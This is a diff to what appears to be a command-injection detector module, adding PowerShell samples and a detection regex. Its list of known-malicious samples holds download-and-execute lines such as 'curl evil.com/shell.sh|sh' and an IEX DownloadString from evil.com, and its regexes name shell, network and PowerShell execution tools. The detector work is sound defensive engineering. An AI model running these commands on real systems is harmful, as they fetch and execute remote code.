@@ -34,6 +34,8 @@ export const cmdSeparator: InvariantClassModule = {
         '; ls \t-la',
         '; id\\x00',
         '; curl evil.com/shell.sh|sh',
+        'powershell.exe -EncodedCommand dABlAHMAdA==',
+        'IEX(New-Object Net.WebClient).DownloadString("http://evil.com/ps.ps1")',
     ],
 
     knownBenign: [
@@ -56,7 +58,8 @@ export const cmdSeparator: InvariantClassModule = {
         const hasSeparatorCommand = /(?:;|\|\|?|&&|`|\n|\r)\s*(?:cat|ls|id|whoami|pwd|uname|curl|wget|nc|ncat|bash|sh|zsh|python[23]?|perl|ruby|php|powershell|cmd|certutil|bitsadmin|net\s+user|reg\s+query|wmic|[A-Za-z_][\w-]{0,32})\b/i.test(d)
         const hasNullBypass = /(?:;|\|\|?|&&|\n|\r)[^\n\r]{0,40}(?:\\x00|%00|\x00)/i.test(d)
         const hasQuoteFragmentBypass = /(?:[a-z0-9]['"]){2,}[a-z0-9]/i.test(normalizedForFragments)
-        if (!hasSeparatorCommand && !hasNullBypass && !hasQuoteFragmentBypass) return false
+        const hasPowerShellExecPrimitive = /(?:-[Ee]ncodedCommand|-[Ee]xec(?:utionPolicy)?\s+[Bb]ypass|IEX\s*\(|Invoke-Expression|Invoke-WebRequest|Start-Process\s+(?:-WindowStyle\s+)?[Hh]idden|\[Ref\]\.Assembly\.GetType)/.test(d)
+        if (!hasSeparatorCommand && !hasNullBypass && !hasQuoteFragmentBypass && !hasPowerShellExecPrimitive) return false
         // Suppress when the command appears inside backtick-quoted code within
         // English prose (documentation context). Real injection uses raw separators,
         // not code-fenced examples surrounded by narrative text.
